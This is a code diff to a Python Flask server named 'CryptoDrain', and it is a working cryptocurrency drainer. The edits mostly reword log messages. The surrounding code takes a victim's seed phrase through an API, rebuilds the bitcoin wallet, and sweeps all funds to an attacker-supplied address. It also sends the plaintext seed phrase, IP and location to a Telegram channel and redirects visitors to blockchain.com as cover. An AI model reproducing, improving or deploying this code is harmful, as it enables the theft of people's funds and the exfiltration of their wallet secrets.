@@ -17,13 +17,15 @@ app = Flask(__name__)
 def boot_screen():
     # clear the screen
     print('\033c')
+    log('Terminal cleared to start the boot screen')
     # print the boot screen
     # print in #F7931A
     # print in orange
-    ascii_banner = pyfiglet.figlet_format('CryptoDrain' )
+    ascii_banner = pyfiglet.figlet_format('CryptoDrain')
     print('\033[33m' + ascii_banner)
     print('\033[33m' + '--------------------- Version 1.2.0 ---------------------')
     print('----------------------- @fled-dev -----------------------' + '\033[0m')
+    log('Boot screen printed successfully')
     print()
     print()
     time.sleep(1)
@@ -45,15 +47,15 @@ def get_config():
     # if log file exists, delete it
     try:
         os.remove('logfile.txt')
-        log('Log file from previous session deleted.')
+        log('Log file from previous session was found and erased')
     except:
-        log('Log file not found. Continuing ...')
+        log('Log file was created successfully')
 
     # open and read the config.json file
     log('Reading config.json ...')
     with open('api/config.json', 'r') as config_file:
         config = json.load(config_file)
-    log('Config.json read successfully.')
+    log('Config.json read successfully')
     # define global variables for the config values
     log('Assigning config values to global variables ...')
     global FLASK_API_KEYS
@@ -61,7 +63,7 @@ def get_config():
     global TG_CHANNEL_ID
     global TG_NOTIFICATIONS
     # assign the config values to the global variables
-    log('Config values assigned to global variables.')
+    log('Config values assigned to global variables')
     FLASK_API_KEYS = config['FLASK_API_KEYS']
     TG_API_KEY = config['TG_API_KEY']
     TG_CHANNEL_ID = config['TG_CHANNEL_ID']
@@ -72,47 +74,48 @@ def get_config():
 def tg_notify(message):
     # check if telegram notifications are enabled
     if TG_NOTIFICATIONS is False:
+        log('Telegram notification was called but is disabled')
         return
     if TG_API_KEY == '':
-        log('Telegram Configuration Error : No API key found.')
+        log('Telegram Configuration Error : No API key found')
         return 'Telegram Configuration Error : No API key found.'
     if TG_CHANNEL_ID == '':
-        log('Telegram Configuration Error : No channel ID found.')
+        log('Telegram Configuration Error : No channel ID found')
         return 'Telegram Configuration Error : No channel ID found.'
 
     try:
-        log('Sending Telegram notification ...')
         api_url = f'https://api.telegram.org/bot{str(TG_API_KEY)}/sendMessage'
         response = requests.post(api_url, json={'chat_id': TG_CHANNEL_ID, 'parse_mode': 'Markdown', 'text': message})
-        log('Telegram notification sent to the API.')
+        log('Telegram notification sent to the API')
         # print success message in the telegram blue
     except Exception as e:
-        log('Telegram notification failed. ' + str(e))
+        log('Telegram notification failed : ' + str(e))
         return 'Telegram Notification Error : ' + str(e)
 
 
 def ip_location(ip):
     try:
         response = requests.get(f'https://ipapi.co/{ip}/json/').json()
+        log('The server sent a request to an external API to get the IP location')
         location_data = {
             "city": response.get("city"),
             "country": response.get("country_name")
         }
         location = location_data['city'] + ' / ' + location_data['country']
-        log('IP location fetched successfully.')
+        log('The external API returned the IP location successfully')
     except:
         location = 'N/A'
-        log('IP location could not be fetched.')
+        log('The external API was not able to determine the IP location')
     return location
 
 
 def current_ip():
     try:
         ip = request.environ['REMOTE_ADDR']
-        log('Environ IP fetched successfully.')
+        log('Successfully fetched the environ IP')
     except:
         ip = 'N/A'
-        log('Environ IP could not be fetched.')
+        log('Environ IP could not be fetched')
     return ip
 
 
@@ -121,16 +124,16 @@ def current_ip():
 
 def api():
     try:
-        # read API key
+        # read api key
+        log('The server received a request to the API and is now checking if the request was authorized')
         api_key = request.args.get('api-key')
-        log('API key read successfully.')
         # check if API key is valid
         if api_key not in FLASK_API_KEYS:
             notification = f'*Error - Connection Refused (1/3)*\n\nSomeone tried to connect to the API without a valid API key.\n\nIP: {str(current_ip())}\nLocation: {str(ip_location(current_ip()))}\nAPI Key: {str(api_key)}'
-            log('Someone tried to connect to the API without a valid API key.')
+            log('Someone tried to connect to the API without a valid API key')
             tg_notify(str(notification))
             return redirect("http://www.blockchain.com")
-        log('Someone connected to the API with a valid API key.')
+        log('Someone connected to the API with a valid API key')
         notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {str(current_ip())}\nLocation: {str(ip_location(current_ip()))}'
         tg_notify(str(notification))
 
@@ -141,7 +144,7 @@ def api():
         balance = request.args.get('balance')
 
         # run the sweep function
-        log('Running the sweep function ...')
+        log('Trying to sweep the wallet ...')
         return sweep(seedphrase, receiver, balance)
     except Exception as e:
         log('An error occured in the api() function: ' + str(e))
@@ -161,7 +164,7 @@ def sweep(seedphrase, receiver, balance):
     print('Scanning Wallet ...')
 
     # generate random wallet name (12 random characters)
-    log('Generating random wallet name ...')
+    log('Generating random wallet name to avoid conflicts ...')
     random_wallet_name = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(12))
 
     # validate the seed phrase
@@ -175,14 +178,14 @@ def sweep(seedphrase, receiver, balance):
         w = Wallet.create(str(random_wallet_name), keys=str(seedphrase), network='bitcoin', witness_type='segwit')
         w.scan()
         w.info()
-        log('Wallet created successfully.')
+        log('Wallet created successfully')
         # send notification -> wallet created
         notification = f'*Success - Wallet Created (2/3)*\n\nThe wallet was created successfull. Find more information below.\n\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
         tg_notify(str(notification))
         print('Success : Wallet Created')   
     except Exception as e:
         # send notification -> wallet creation failed
-        log('Wallet creation failed. ' + str(e))
+        log('Wallet creation failed : ' + str(e))
         notification = f'*Error - Wallet Creation Failed (2/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
         tg_notify(str(notification))
         print(f'Error : {str(e)}')
@@ -191,14 +194,14 @@ def sweep(seedphrase, receiver, balance):
     # try to sweep the wallet
     try:
         t = w.sweep(str(receiver), offline=False)
-        log('Wallet swept successfully.')
+        log('Wallet swept successfully')
         # send notification -> wallet swept
         notification = f'*Success - Wallet Swept (3/3)*\n\nThe wallet was swept successfull. Find more information below.\n\nReceiver: {receiver}\nBalance (not verified): {str(balance)} BTC'
         tg_notify(str(notification))
         print('Success : Wallet Swept (3/3)')
         return redirect("http://www.blockchain.com")
     except Exception as e:
-        log('Wallet sweep failed. ' + str(e))
+        log('Wallet sweep failed : ' + str(e))
         notification = f'*Error - Wallet Not Swept (3/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
         tg_notify(str(notification))
         print(f'Error : {str(e)}')
@@ -227,7 +230,7 @@ if __name__ == '__main__':
         http_server.serve_forever()
         # notification is not possible because the server started already
     except Exception as e:
-        log('An error occured in the main function: ' + str(e))
+        log('An error occured in the main function : ' + str(e))
         # send notification -> fatal error
         notification = f"*Fatal Server Error - Flask Server Couldn't Start*\n\n{str(e)}"
         tg_notify(notification)
